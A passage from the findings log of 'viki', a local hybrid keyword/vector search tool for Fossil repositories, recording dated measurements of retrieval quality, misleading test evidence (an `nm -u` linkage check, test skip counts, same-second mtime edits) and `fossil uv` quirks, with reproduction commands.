query_is_identifier` absent from shipped source -> the revert is genuinely in
effect. A ranked result can never establish that.

**WHERE BOTH FAILED, and this is the finding.** The question that asked what
had CHANGED defeated both. grep recovered by a lucky hunch -- it checked
commit dates and discovered the files are numbered newest-first: *"if I'd
assumed ascending chronology I would have gotten Q2 backwards."* viki could
not recover at all; its attempt returned zero rows **silently** (see the
anchoring bug below) and it named that as its largest remaining uncertainty.

Both landed on the right answer anyway, and neither tool is why. **The corpus
rescued them**: QUEUE.md is append-only by policy, §23 self-labels as a
retraction of §14/§21, and the deprecation banners are explicit. grep called
a heading map "the single best move of the session."

> The authoring convention did the work the retrieval tools could not. For
> multi-agent collaboration that is the transferable lesson: numbered claims,
> dated corrections appended rather than edited in place, and explicit
> "supersedes X" markers are worth more than either search tool, because they
> put the supersession relation in the DATA where any tool can find it. This
> is the same conclusion the |cos| detour reached from the other direction --
> when the structure is not in the data, no scoring function recovers it.

Two defects fell out of the trial, both now fixed: `viki grep`'s `^`/`$`
anchored to the whole CHUNK rather than to lines (a silent empty result that
reads as "this does not exist"), and there was no time dimension at all --
`viki_source` had `mtime` for files and deliberately 0 for every virtual
source, with the artifact's real time buried in prose.

## Rare words are not unrepresented -- they are only representable AGAINST THEMSELVES

**Date:** 2026-08-20. Chasing why a *correct* semantic retrieval scored a
cosine of only 0.1859 while a *garbage* query scored 0.2174 on another corpus.

Warren's hypothesis was that a 384-dimension model has roughly toki pona's
expressive budget, so a domain word like `elastomer` "could easily just be
0's". The tokenizer half of that checks out -- against the real
`build/dist/model/vocab.txt` (30522 tokens), domain vocabulary shreds:

```
elastomer -> el ##ast ##ome ##r      subzero -> sub ##zer ##o
fetlock   -> fe ##tl ##ock           propane -> prop ##ane
```

while `rubber`, `cold`, `material`, `horse`, `sock` are clean single tokens.

**But the "zeros" conclusion is wrong, and the truth is more useful.** The
same facts written two ways, queried three ways (noise control 0.0752):

| query | vs ORIGINAL wording | vs SIMPLIFIED wording |
|---|---|---|
| technical: "synthetic elastomer performance in subzero conditions" | **0.6452** | 0.3042 |
| plain: "did the rubber seal stay soft in very cold weather" | 0.4961 | **0.8191** |
| domain: "which horse has a right front sock" | **0.5093** | 0.3115 |

A technical query matches a technical document at 0.6452 -- *because both
shred into the same fragments, and consistent noise correlates with itself*.
`elastomer` is not a hole in the space; it is a private token that matches
nothing but its own spelling. The failure is never blindness, it is
cross-vocabulary matching: you write `off fore` and later ask `right front`.

**Consequence for design.** A simplified restatement must NOT replace the
original -- it loses 0.34 and 0.20 on domain-worded queries. As a SECOND
vector citing the same `content_hash`, taking `max()` over forms, it never
loses and sometimes wins hugely (0.4961 -> 0.8191). That makes simplified
restatement and doc2query the same mechanism -- alternative surface forms of
one chunk -- and they should be built once, not twice. See QUEUE.md §26.

Provenance rule that falls out of it: rank on whichever form matched, but
CITE THE ORIGINAL. A machine-generated restatement is an index artifact, not
evidence, and quoting it back as though it were the note is the
unmarked-fragment defect wearing a new costume.

## Retrieval confidence cannot come from the fused score, and no global cosine floor works either

**Date:** 2026-08-20. `viki ask` could not distinguish "here is the answer"
from "here are the three least-bad rows in a corpus containing no answer".

First trap: **the RRF score cannot carry confidence and never could.**
Reciprocal rank fusion is purely positional, `1/(K+rank)`, so the top hit
scores ~1/61 whether it is perfect or worthless. `run_vector()` was
`ORDER BY`-ing on a cosine it then discarded, so the absolute evidence was
thrown away before any score existed. It is now SELECTed and reported.

Second trap, which killed the feature as originally specified: **there is no
corpus-independent cutoff.** Shipped default-on at 0.30, calibrated where
answerable queries scored 0.62-0.79 and garbage 0.14-0.22. It broke six
assertions across two probes, because on a different corpus a CORRECT
semantic retrieval scores **0.1859** -- below the **0.2174** that garbage
scores on the first one. Cosine magnitude tracks chunk length and corpus, not
correctness. Margin-from-median and best/median ratio fail identically: the
correct hit has a SMALLER margin (0.110) than the garbage query (0.123), and
nonsense scores the second-highest ratio in the set.

So viki reports the evidence and declines to judge; `--min-cos` is opt-in.
This is the same division of labour as the HyDE convention: the caller is an
agent that can threshold for its own corpus. Anyone tempted to re-enable a
default threshold should re-run those two numbers first.

## Two retrieval improvements that each measured well ALONE lost most of their gain when combined: the ranking work is worth +0.139 recall@1 on a 114-chunk corpus and +0.024 on the same corpus once 24 check-in-comment chunks are added

**Date:** 2026-08-16, integrating the "episodic memory" round.

Four agents worked in parallel on one tree. Two of them changed retrieval:
one improved ranking (`src/viki_ask.c` -- adjacent-word FTS phrases, df-based
term dropping, skipping the vector leg on identifier queries), one closed the
Fossil coverage gap (`src/viki_index.c` -- check-in comments, tech notes,
ticket changes, attachments, unversioned files). Each measured its own change
against its own control and both were real. **Neither measured the other's
corpus, and the round's headline number is not the sum.**

The 2x2, same corpus directory re-indexed in place by each binary, same 59
queries, k=10, hybrid, ALL indexed-answer queries (n=43):

```
                        HEAD ask                A's ask            A's gain
  HEAD index (114ch)    0.256 / MRR 0.368   0.395 / MRR 0.504   +0.139 / +0.136
  D's index  (138ch)    0.209 / MRR 0.337   0.233 / MRR 0.404   +0.024 / +0.067
  corpus fp             944601a216257d69    94b0908c4729bc2c
```

**A's recall@1 gain shrinks by 83% and its MRR gain by 51%** purely because
the corpus grew by 24 chunks -- and grew with *correct, relevant* content.
The mechanism is visible per query: 9 of 43 indexed-answer queries now have a
newly-indexed chunk at rank 1, and 5 queries that held rank 1 on the small
corpus lost it to one (Q01 Q04 Q05 Q09 Q10). Check-in comments compete
directly with the documents written from them, because in this repo the
commit log and `FINDINGS.md` say the same things in different words.

**Repro:** the four cells are
`bash test/retrieval-eval.sh --no-build --corpus <copy> --viki <bin>` over
`{scratchpad/agentA/build,scratchpad/D,scratchpad/agentA/b_final,build}/dist/viki`,
re-indexing the copy between runs. Both control cells reproduced their
authors' reported numbers exactly, so the dilution is not a measurement
artefact.

**Wrong assumption replaced:** that a ranking improvement measured on a fixed
corpus and a coverage improvement measured on a fixed ranker compose. They
do not, and the interaction is not small. **Process consequence:** when two
agents change retrieval in one round, the integrator must measure the 2x2,
not the two diagonals -- and a parallel-agent plan should say which corpus
each agent's numbers are quoted against.

---

## Closing the coverage gap made the single-anchor ground truth WRONG, not just incomplete: 4 of the 5 queries that lost rank 1 lost it to a chunk that answers the question better than the gold anchor does

**Date:** 2026-08-16, integrating the "episodic memory" round.

`test/retrieval-queries.tsv` scores one anchor substring per query. That was
sound when the corpus was eight documents. Once check-in comments are
indexed, several questions have **two** true answers -- the document, and the
commit message the document was written from -- and the harness can only
credit one.

Adjudicated by hand, all 5 rank-1 losses caused by a new-class chunk
(text quoted from the run, so the judgement is checkable):

| query | displacing chunk | verdict |
|---|---|---|
| Q05 "the vector extension will not compile on this architecture, do I patch it here" | `ckin:8a71aacb` *"Rejected: forking sqlite-ndvss to fix its build. KICKOFF.md says do not fork it, and a bug in a vendored project is that project's bug."* | **better than gold** -- the decision WITH its rejected alternative |
| Q09 "my parser is silently dropping empty columns when I split the output of a fossil command" | `ckin:1f10a101` *"strtok_r treats a run of consecutive delimiters as ONE delimiter and never yields an empty token between them"* | **exact answer** |
| Q10 "searching for a whole sentence returns nothing but a single word from it works fine" | `ckin:d9d5712b` *"Symptom: asking for a sentence returned zero results while asking for a single word from the same sentence worked. SQLite FTS5's default MATCH syntax treats space-separated barewords as an implicit AND"* | **exact answer, verbatim symptom** |
| Q01 "why does the keyword half of the search not filter by model id" | `note:38cbc031` *"The keyword leg is not filtered by model_id and must never be. A chunk may exist only under model_id='none'"* | **exact answer** |
| Q04 "we need https and a password on the local search server, do I link openssl into the C" | `ckin:35d3d554` (the `viki serve` design check-in) | topical, not the answer -- a genuine loss |

So **the reported recall@1 of 0.233 understates the binary**: on 4 of the 5
losses the user gets a correct answer at rank 1 and the harness scores a
miss. The harness is not broken -- its anchor resolver already grew the gold
set automatically on 4 other queries (Q17 Q36 Q58 Q59) where the same words
happen to appear in a new-class chunk. The failure is that ground truth
written against an 8-document corpus does not survive that corpus tripling.

**Deliberately NOT fixed this round.** Adding alternate anchors *after
seeing which chunks won* is fitting the ground truth to the result, which is
how an eval stops being able to detect a regression. The fix has to be a
pre-registered pass over `retrieval-queries.tsv` that names every acceptable
answer per query without consulting a ranking.

**Wrong assumption replaced:** that "recall@1 went down" means retrieval got
worse. On a corpus that just gained a second true source for the same facts,
a single-anchor metric measures *which* true answer wins, not *whether* one
does.

---

## `viki ask`'s vector leg costs precision at rank 1 on a real repo too, not just in the eval: a query containing a term that occurs in exactly ONE chunk ranks that chunk 1st with BM25 alone and 3rd with hybrid

**Date:** 2026-08-16, hand-checking the new artifact classes outside the eval
corpus.

Built a real Fossil repo from viki's own git history
(`git fast-export --all | fossil-see import --git`), 21 real check-ins, and
indexed it: `21 check-in comment(s), 21 (re)chunked`, 282 chunks total.
`sandbox-exec` appears in **no tracked file** -- only in commit `bd04683`'s
message -- and is therefore indexed in exactly one chunk, under
`ckin:382632ddf868aa00…`.

```
query: "sandbox-exec networking denied fresh clone"
  BM25-only  [1] ckin:382632dd…   <- correct, rank 1
  hybrid     [1] ./FINDINGS.md#16
             [2] ./src/viki.c#1
             [3] ckin:382632dd…   <- displaced to rank 3
```

Neither chunk that outranks it contains the term. The vector leg cannot see
a rare token (it is one WordPiece among 254 in a 40-line chunk), so it votes
on topical similarity and RRF promotes two chunks that are *about* the
subject over the one chunk that *contains* the fact. Shortening the query to
just `sandbox-exec` restores rank 1, which localises the cause to the common
terms, not to the rare one.

This is the same conclusion `test/retrieval-eval.sh` reaches from the
BM25-only control column, reproduced on a corpus that is not the eval corpus
and was not used to tune anything. **Worth knowing before someone "fixes"
the eval by rewriting queries: the effect is in the retrieval, not the
question set.**

**Repro:** `scratchpad/INTEG/real/` (repo + checkout); index with
`VIKI_FOSSIL_BIN=vendor/fossil-see/build/dist/fossil-see viki index .`, then
run the query with and without `VIKI_MODEL_DIR` pointed at a real model.

---

## First measured retrieval baseline: adding the vector leg makes `viki ask` WORSE at rank 1 than BM25 alone (0.256 vs 0.302), the keyword leg matches the entire corpus for the median query, and 21 of 43 answerable questions get the right document with the wrong chunk

**Date:** 2026-08-16, building `test/retrieval-eval.py` -- the first time
anything in this repo has measured retrieval *quality* rather than
retrieval *existence*.

Everything before this round proved that retrieval **works**: `test/m1.sh`
proves a planted answer comes back, `build/forum-e2e-probe.sh` proves forum
content comes back, `embed-selftest` proves the vectors are semantically
real. None of them says whether the answer comes back **first**, and the
corpora were three to fifteen tiny documents. FINDINGS.md already warned
that "a k=5 default over a 6-chunk corpus makes 'was it retrieved?' almost
free". This entry is what happens on a 114-chunk corpus with 59 questions
that were written before their answers were looked up.

### The harness and corpus

`test/retrieval-corpus.sh` builds an **encrypted** scratch repo containing
this repo's own episodic record (FINDINGS.md, AGENTS.md, CLAUDE.md,
VIKI_DESIGN.md, KICKOFF.md, USER_STORIES.md, ARCHITECTURE.md,
ENCRYPTION.md) committed under 14 check-in comments ported verbatim from
viki's git log, plus 2 wiki pages, 4 tickets, a thread-start forum post, a
reply, an edit of that reply, a tech note, an attachment, a branch with
tags, an unversioned file, and one file rewritten so its earlier text
exists only in history. `test/retrieval-queries.tsv` holds 59 questions in
six classes, 18 of them (31%) **held out**. `test/retrieval-eval.py`
scores them.

Ground truth is a literal **anchor substring**, not a
`content_hash#chunk_ix`. That was not a stylistic choice: a hash moves
whenever a document is edited and `chunk_ix` moves whenever chunking
changes -- which is an epoch bump, exactly the change this eval exists to
justify -- so hard-coded ids would silently invalidate the whole file the
first time somebody improved anything. Resolving the anchor at run time
also makes the coverage measurement free: an anchor that resolves to no
chunk means the artifact holding that answer is not in the index.

**Trap worth knowing before writing any anchor:** `chunk_text` preserves
the source's hard wrapping, so an anchor that spans a line break never
matches. Twelve of the first fifty-nine anchors failed for exactly that
reason and looked, in the report, identical to a genuine coverage gap. The
harness now flags an `expect=indexed` query whose anchor resolves to
nothing as a QUERY-SET DEFECT and excludes it, rather than scoring it as a
retrieval failure.

### The baseline, verbatim

`bash test/retrieval-eval.sh`, `build/dist/viki` (2026-08-13 19:48:15
build), model `all-MiniLM-L6-v2-qint8-arm64` present, k=10:

```
                                n     recall@1  recall@5  recall@k   MRR
HYBRID   dev                    31     0.226     0.452     0.645     0.319
HYBRID   test (HELD OUT)        12     0.333     0.750     0.750     0.493
HYBRID   all indexed-answer     43     0.256     0.535     0.674     0.368
BM25-ONLY all indexed-answer    43     0.302     0.465     0.558     0.375
```

Index coverage, reported separately because it is a different defect:

```
0 of 16 queries whose answer lives in an un-indexed artifact are
answerable AT ALL.  checkin-comment 0/9, technote 0/2, attachment 0/1,
file-history 0/1, tag 0/1, ticket-change 0/1, uv 0/1.
```

### 1. Hybrid loses to BM25-only at rank 1. Measured, twice, both directions.

`recall@1` **drops** from 0.302 to 0.256 when the vector leg is switched
on, and MRR is a wash (0.375 -> 0.368). Hybrid buys recall@5 (0.465 ->
0.535) and recall@10 (0.558 -> 0.674). So the vector leg is not useless --
it is *pulling answers into the top ten that BM25 never finds* (7 queries)
-- but it is **displacing** the ones BM25 already had right (2 lost
outright, 8 demoted).

The mechanism is RRF doing exactly what RRF does, and it is worth seeing
once. `viki ask "what does find_w_card do"` -- an exact identifier lookup,
the easiest possible case:

```
$ cd <corpus>/co
$ VIKI_MODEL_DIR=/no/such/dir viki ask "what does find_w_card do" --k 10
[1] rrf=0.0164  c1d9b4a45712...#54  ./FINDINGS.md     <- the chunk that defines it
$ VIKI_MODEL_DIR=<model> viki ask "what does find_w_card do" --k 10
[1] rrf=0.0274  5b717dd64813...#16  ./AGENTS.md
[2] rrf=0.0274  c1d9b4a45712...#42  ./FINDINGS.md
...                                                    <- #54 is NOT in the top 10
```

`0.0164 = 1/61` is one leg at rank 1. `0.0274 = 1/72 + 1/74` is two legs at
ranks 12 and 14. **A chunk both legs rank in the middle beats a chunk one
leg ranks first**, and with `poolSize = 40` against a 114-chunk corpus each
leg nominates 35% of everything, so "both legs saw it" is nearly free. The
fusion constant `VIKI_RRF_K = 60` is what sets that exchange rate and
nothing has ever tuned it.

**Wrong assumption this replaces:** that hybrid retrieval is a strict
improvement over its rung-0 floor, so the only question about rung 2 is
whether it *works*. AGENTS.md's standing evidence for the vector leg is a
query with zero keyword overlap, where BM25 contributes nothing by
construction -- the one case where fusion cannot hurt. On queries that do
have keyword overlap, which is most of them, it can and does.

### 2. The keyword leg is not a filter. It matches the whole corpus.

`build_or_query()` ORs every whitespace-separated term, and `chunk_fts`
uses `porter unicode61` with **no stopword list**. So a natural-language
question matches essentially everything:

```
keyword-leg selectivity over the 43 indexed-answer queries:
  MEDIAN 114 of 114 chunks matched   (min 83, max 114)
  42 of 43 queries match >90% of the corpus
```

The OR-of-terms fix (FINDINGS.md, below) was right and is not being
relitigated -- implicit-AND returned nothing at all. But its consequence
was never measured: BM25 is not selecting candidates, it is *ranking the
entire corpus*, and one stopword is enough to admit any chunk. FINDINGS.md
already noticed the symptom in the small ("a single standalone 'a'
anywhere in the corpus is a full-weight BM25 hit", and m1.sh's grocery.md
says "one bag" rather than "a bag" to dodge it); the scale of it is new.
`chunk_fts`'s tokenizer is local, rebuildable and **free to change** --
unlike `src/tokenizer.c`, which must conform to what all-MiniLM-L6-v2 was
trained on -- so this is the cheapest thing on this list to try.

### 3. Right document, wrong chunk: 21 of 43.

In 21 of the 43 answerable queries, a **different chunk of the gold
document** outranks the gold chunk; in 9 of those it sits at rank 1. Fixed
40-line chunks with no overlap put the vocabulary that would find an answer
in one chunk and the answer itself in the next. `Q07`, `Q13`, `Q18` and
`Q25` fail against the *immediately adjacent* chunk.

This is the first evidence that "chunking is naive" costs measurable
recall rather than being tidiness debt. It is also the most expensive
thing on this list to fix: chunk parameters are part of the epoch pin
(D-11), so changing them is a fleet-wide **epoch bump**, not a local
tweak.

### 4. Superseded facts: only one clean win for the stale answer, but the class is the weakest overall.

The query set marks, for eight questions, a `trap` -- a chunk carrying the
answer that *used to be* true. Only `Q23` ("does the acceptance test say
anything at all about forum posts") actually returns the superseded chunk
above the current one. But the `superseded` class as a whole is the worst
performer on dev (`recall@1 = 0.200`, `recall@5 = 0.200` over 5 queries),
because the corpus states the same fact at several dates and the retriever
has no notion of *when* -- it returns some correct-looking chunk from the
right neighbourhood and no signal about which is current.

### 5. `fossil ticket change +comment` is indexed; a change that REPLACES a field is not.

Found while trying to build a ticket-change coverage gap and failing.
`+comment` **appends into the ticket's own `comment` field**, so `fossil
ticket show 0` reports it and `viki index` picks it up -- an appended
comment is not a gap at all. A change that *replaces* a field writes the
new value into `ticket` and the per-change record into `ticketchng`, which
nothing in viki reads, so only there does the previous value become
unreachable. The corpus now plants both, so the pair is a control.

### Repro

```sh
bash test/retrieval-corpus.sh /tmp/viki-retrieval-eval   # ~40 s, once
bash test/retrieval-eval.sh                              # ~5 s, 118 asks
bash test/retrieval-eval.sh --failures                   # per-query taxonomy
VIKI_BIN=/path/to/your/build bash test/retrieval-eval.sh # score a change
```

**Non-vacuity, measured rather than asserted.** A shim that forwards
everything to the real binary but forces `ask` into degraded mode scores
`recall@1=0.302 recall@5=0.465 recall@k=0.558 MRR=0.375` -- byte-identical
to the harness's own BM25-only control -- and drives fusion
helped/hurt/demoted to `0 / 0 / 0`. The harness measures the binary.

**Stability, also measured.** Three runs against one corpus are identical.
A full corpus *rebuild* leaves `recall@1` and `recall@5` unchanged but
moves `recall@k` and MRR by ~0.02, because ticket and forum artifact UUIDs
are timestamp-derived and are part of the indexed text. `k` is not a
confound: `k=5`, `k=10` and `k=20` give identical `recall@1` and
`recall@5` despite `k=5` halving the candidate pool.

**And the corpus is this repo's own docs, so editing them moves the
baseline.** The harness prints a `corpus fp` fingerprint over
`(path, content_hash)` for every non-ticket, non-forum source. A baseline
quoted against a different fingerprint is a different experiment. Re-measure
the old binary before claiming a new one improved anything.

---

## `nm -u` can never show that something is *not* statically linked -- it lists only UNDEFINED symbols, and static linking produces DEFINED ones. viki's own binary proves the trap.

**Date:** 2026-08-13, doc-truth audit after three fixes landed concurrently.

AGENTS.md and FINDINGS.md both closed KICKOFF.md's `experiments/harness.c`
regression gate with what looked like the strongest kind of evidence this
repo asks for -- a measurement on the shipped binary rather than an appeal
to the design:

```
$ nm -u build/dist/viki | grep -ic fossil
0
```

followed by "Zero *undefined* Fossil symbols means nothing Fossil is
linked at all."

**The conclusion is true; the proof does not establish it.** `nm -u`
prints *undefined* symbols -- precisely the ones a **dynamic** dependency
leaves behind for the loader. Static linking copies the code in, producing
*defined* symbols, which `-u` suppresses by construction. A binary with an
entire in-process Fossil statically linked into it returns the same `0`.
The command cannot distinguish "no Fossil" from "Fossil, statically
linked", and that distinction is the entire claim.

This is not hypothetical here -- viki statically links `sqlite-ndvss` **on
purpose**, and ships a subcommand whose only job is to prove it. Run the
same shape of check against that:

```
$ nm -u build/dist/viki | grep -ic ndvss
0                      # by the old reasoning: "nothing ndvss is linked at all"
$ nm build/dist/viki | grep -ic ndvss
15
$ nm build/dist/viki | grep -i ndvss | head -2
000000010012567c t _ndvss_convert_str_to_array_d
00000001001257fc t _ndvss_cosine_similarity_d
$ build/dist/viki ndvss-selftest
ndvss instruction set: neon
```

Same command, same binary, `0` for a library that is demonstrably compiled
in and running. The correct check is the full symbol table:

```
$ nm build/dist/viki | grep -i fossil
00000001000066f8 t _unquote_fossil
00000001000070a4 T _viki_fossil_binary
0000000100007214 T _viki_fossil_user
```

Three symbols, all viki's own: `unquote_fossil()` is the manifest-card
un-escaper in `viki_index.c`, and the other two resolve the fossil
*subprocess* and its user. No Fossil implementation in any linkage form.
Both docs now cite this instead.

**Wrong assumption it replaces:** that "measured on the artifact" is
automatically stronger than "argued from the design". A measurement can be
*irrelevant to the claim it is attached to*, and that is more dangerous
than an argument, because a command with output looks settled and invites
nobody to re-derive it. Before quoting a tool as proof, check that the
tool's semantics answer the question actually being asked -- `nm`'s `-u`,
`-U`, `--dynamic` and friends each silently change what "the symbols"
means, and only one of them was the right one here.

---

## "Against a pre-fix binary" is not a fixed reference point: the forum probe scored 18/8 and later 17/9 with no forum-code change at all -- the extra red assertion was rewritten by somebody else's fix

**Date:** 2026-08-13, reconciling docs after three fixes landed concurrently.

AGENTS.md asserted in three places that `build/forum-e2e-probe.sh` scores
`18/26` against "a pre-fix binary", offered as the proof that the forum
assertions are able to fail. Re-measured from a binary compiled out of git
`HEAD`'s `src/`: **`PASS=17 FAIL=9`**. Nothing about the forum fix, the
forum code, or the four planted artifacts changed, and the probe still has
exactly 26 assertions (`18+8 = 17+9 = 26`).

**What moved was the test, not the code under test.** The failure sets
differ by exactly one id:

```
then:  B4 B5 B6 B7 C1 C2 C3 C4          8 red
now:   B4 B5 B6 B7 C1 C2 C3 C4 C6       9 red
```

`C6` is the *attribution* assertion. A concurrent fix to `viki_ask.c`
changed every hit line to lead with `<content_hash>#<chunk_ix>`, and `C6`
was rewritten to match; a binary without that fix prints the old format, so
it now fails an assertion that has nothing to do with the three forum
parsing bugs. The whole 8 -> 9 delta is explained by the probe, with no
evidence of any behavioural difference between the two builds.

**And the phrase was overloaded**, which is why nobody caught it. Read
literally, "a pre-fix binary" could name either (1) `src/` with **only**
`viki_index.c` reverted, as of the forum round, or (2) **all** of git
`HEAD`'s `src/`, i.e. before all three of this round's fixes. Only (2) is
reconstructible from the repo (recipe in the forum entry below); (1) is
a working-tree state that no longer exists anywhere. A number offered as
proof was pinned to a build nobody can rebuild.

**Wrong assumption it replaces:** that a "provably able to fail" number is
a property of the fix. It is a property of the **pair** (binary under test,
test as of that moment), and in a repo where several agents edit the tests
and the code in the same afternoon, the test half moves at least as often.
Record the binary's provenance in reconstructible terms -- "compiled from
git `HEAD`'s `src/`", not "pre-fix" -- and re-measure the number whenever
the *test* changes, not only when the code does.

---

## Assertion counts are not fungible: one skip figure was doing duty for three different degradations, and "36 added" and "36 failing" are different sets of 36

**Date:** 2026-08-13, doc-truth audit after `test/m1.sh` grew from 54 to 90.

Two counting traps, both of which had already been copied into AGENTS.md
and CLAUDE.md as fact.

**1. A skip figure belongs to a condition, not to a test.** Both docs said
that with "no model, OR no `sqlite3` on PATH" m1.sh gives `43 passed, 0
failed, 11 skipped`. That was the *no-model* case, of the *54-assertion*
file. Measured on 2026-08-13, same binary, same file, four environments:

```
model + sqlite3 (full run)        90 passed, 0 failed,  0 skipped   exit 0
no model, sqlite3 present         64 passed, 0 failed, 26 skipped   exit 0
model present, no sqlite3         80 passed, 0 failed, 10 skipped   exit 0
neither                           57 passed, 0 failed, 33 skipped   exit 0
```

The two degradations do **not** add -- 26 + 10 = 36, but "neither" skips
33, because `B2`, `C11` and `J1` require both and are skipped once.

Worse, the natural one-line summary both docs used -- AGENTS.md said "both
halves of the vector proof" are skipped without a model, CLAUDE.md said
"the whole vector proof" -- is false. `A12` ("VECTOR PROOF (half 1):
semantic query finds NOTHING without a model") **runs and PASSES** in the
no-model run; it is the half whose premise is *absence*, so removing the
model is the very condition it describes. Only `B5` is skipped. **A
two-sided proof degrades one-sidedly**, and that is what makes a skipping
run dangerous: the surviving half still prints `PASS` next to the words
"VECTOR PROOF".

**2. Two equal counts are not the same count.** The file grew 54 -> 90 (36
added) and a `HEAD`-built binary fails 36 of the 90. Those sentences sat
next to each other, and the obvious reading -- the 36 that fail are the 36
that are new -- is wrong. Measured with `comm` over the id lists:

- 26 of the 36 **added** assertions fail against the pre-fix binary;
- 10 of the 36 **added** assertions **pass** against it -- `G2 G3 G4b G5b
  H11b J4 M1b M3 M8 M9`, mostly *controls*, which are supposed to come out
  the same either way;
- the other 10 failures are **pre-existing** assertions -- `A9 A10 B4 B5 B6
  C12 C13 C14 C16 C17` -- red only because the fixes changed `viki ask`'s
  hit-line format.

So the real statement is weaker in one direction (10 of the new assertions
cannot fail against the un-fixed code, by design) and broader in another (a
formatting change reddened 10 of the 54 *pre-existing* assertions -- nearly
a fifth of the old suite). "36 of 90" states neither.

### Repro

```sh
# "no sqlite3" needs a PATH that still has everything else, so build a
# symlink farm of every PATH entry EXCEPT sqlite3 (bash, not zsh -- zsh
# does not word-split $PATH on IFS):
FARM=/tmp/nosql; rm -rf $FARM; mkdir -p $FARM
IFS=:; for d in $PATH; do
  [ -d "$d" ] || continue
  for f in "$d"/*; do b=$(basename "$f")
    [ "$b" = sqlite3 ] && continue
    [ -e "$FARM/$b" ] && continue
    ln -s "$f" "$FARM/$b" 2>/dev/null
  done
done; unset IFS

# the four environments (VIKI_MODEL_DIR must point at a directory that does
# NOT exist -- an unset/empty value falls back to build/dist/model)
bash test/m1.sh                                              # 90/0/0
VIKI_MODEL_DIR=/no/such/dir bash test/m1.sh                  # 64/0/26
PATH=$FARM bash test/m1.sh                                   # 80/0/10
PATH=$FARM VIKI_MODEL_DIR=/no/such/dir bash test/m1.sh       # 57/0/33

# the two id sets
bash test/m1.sh 2>&1 | grep -oE '^  (PASS|FAIL|SKIP)  [A-Za-z0-9]+' \
  | awk '{print $2}' | sort > ids.new                        # 90
# $PREFIX is the scratch prefix holding a binary built from pre-fix HEAD
# sources -- the same D=/tmp/prefix build recipe the forum entry below
# spells out in full. Without it this line silently runs an empty VIKI_BIN.
VIKI_BIN=$PREFIX/dist/viki bash test/m1.sh 2>&1 \
  | grep '^  FAIL' | awk '{print $2}' | sort > ids.failhead  # 36
# ids.old = the same id list for the 54-assertion file, taken from a
# preserved copy of it:  grep -oE '"[A-Z][0-9]+[a-z]?b? ' m1.sh.orig
#                        | tr -d '"' | awk '{print $1}' | sort -u
comm -23 ids.new ids.old > ids.added                        # 36 added, 0 removed
comm -12 ids.added ids.failhead    # 26 -- new AND failing
comm -23 ids.added ids.failhead    # 10 -- new AND passing
comm -13 ids.added ids.failhead    # 10 -- pre-existing AND failing
```

**Wrong assumption it replaces:** that a single "N passed / N skipped"
figure characterises a test. It characterises one run of one version of it
in one environment. Any figure whose parts sum to a stale total (43 + 11 =
54, here) is stale by construction -- that arithmetic is the cheapest way
to spot the whole class.

---

## `viki index` trusts mtime alone, so content edited within the same second is invisible -- and a stale-content test written the obvious way passes while proving nothing

**Date:** 2026-08-13, writing `test/m1.sh` section 7 (edit/delete invalidation).

`index_text_blob()` short-circuits on `previously_seen_unchanged()`, which
compares only the stored `mtime` against `stat()`'s. mtime has 1-second
granularity, so a document rewritten in the same second it was indexed is
never re-hashed -- the new invalidation code never runs, and the *old* text
keeps answering:

```
$ viki index .                       # docs/a.md indexed
$ printf '...different text...' > docs/a.md   # same second
$ viki index .
viki index: 2 file(s) scanned, 0 (re)chunked ... (model_id=none)
viki index: 0 stale source(s) retired, 0 orphan chunk(s) removed
$ viki ask "zeppelin mooring ochre"          # the REPLACED wording
[1] rrf=0.0164  40fecd0bb219f17df6807b49681a1e71c2658fe7c2ea022e8827da38f35cd366#0  ./docs/a.md
$ touch -t 202001010000 docs/a.md && viki index .
viki index: 2 file(s) scanned, 1 (re)chunked ... ; 0 stale source(s) retired, 1 orphan chunk(s) removed
$ viki ask "zeppelin mooring ochre"
(no matches)
```

(Repro script: the mtime was restored to the exact indexed value with
`os.utime()` read back out of `viki_source`, so this is the same-second case
made deterministic rather than raced.)

Two consequences, and the test one is the nastier.

**For the test:** a section that writes a file, re-indexes, and asserts "the
old text is gone" would have been green on *every* machine fast enough to do
all three inside one second -- while testing nothing at all, because the
re-index was a no-op. This is precisely the vacuous-pass failure mode
`test/m1.sh`'s header warns about, and it arrives by way of the machine's
clock rather than a bad assertion. Every mutation in section 7 is therefore
followed by an explicit `touch -t 202001010000`, and H3/H7 assert the
`N stale source(s) retired, N orphan chunk(s) removed` line is *nonzero*, so
a no-op re-index is a FAIL rather than a silent pass.

**For viki:** this is a real limitation of `viki index`, not just a test
artifact -- generated or scripted writes that preserve or coincide with an
mtime are simply not seen. It is a deliberate trade (the alternative is
re-hashing every file every run), but it means "I re-indexed" is not the same
statement as "the cache reflects the tree".

---

## `fossil uv list` ALWAYS prints the detail columns, so `uv list | grep -q '^name$'` never matches -- and in the negative direction that is an assertion which cannot fail

**Date:** 2026-08-13, adding the model leg to `viki cache push`/`pull`.

`fossil uv help` lists `-l  Show additional details` as an *option* of the
`list` subcommand, and then adds, easy to miss, "**Implied when 'list' is
used**". There is no bare-name output mode at all: every line is
`HASH DATE TIME SIZE STOREDSIZE NAME`.

```
$ fossil uv list -R hub.efossil
ee7427b961c4 2026-08-14 01:15:48    49152     9620 viki-cache.db
4f1e896361b8 2026-08-14 01:15:43 23026053 17464352 viki-model/model.onnx
$ fossil uv list -R hub.efossil | grep -c '^viki-cache.db$'
0
```

The first run of `build/model-uv-e2e-probe.sh` had five checks red for exactly
this reason -- they were testing the grep pattern, not the push. The dangerous
direction is the negative one: `! fossil uv list | grep -q '^viki-model/'`
("prove the model was NOT published") passes no matter what the hub holds.
Every uv assertion in that probe now matches with `awk '$NF=="..."'`, and the
size check uses `$(NF-2)` -- note `SIZE` is the real byte count and the column
after it is the *compressed stored* size (23,026,053 -> 17,464,352 for the
pinned model), so the two are easy to transpose.

---

## `fossil uv add` has no unchanged-content short-circuit: re-publishing the identical 23 MB model costs ~1.1s of CPU and a mtime-only push, every single time

**Date:** 2026-08-13, deciding whether `viki cache push` should re-send the model.

`unversioned_write()` in fossil's `unversioned.c` is an unconditional
`REPLACE INTO unversioned(...)` with `mtime` bound to `now` -- it never
compares the new content against the row already there. So a second identical
`uv add` re-hashes and re-deflates the whole blob locally, and the bumped
mtime then makes every subsequent sync announce the file as changed:

```
$ time fossil uv add build/dist/model/model.onnx --as viki-model/model.onnx
  1.14s user 0.05s system 98% cpu 1.203 total       # identical bytes, already there
$ fossil uv sync -n -v
  UV-PUSH-MTIME-ONLY: viki-model/model.onnx
  done, wire bytes sent: 586  received: 858
```

The *wire* cost is nil (586 bytes -- fossil compares hashes before shipping
content, so status 4 in `unversioned_status()` sends metadata only). The cost
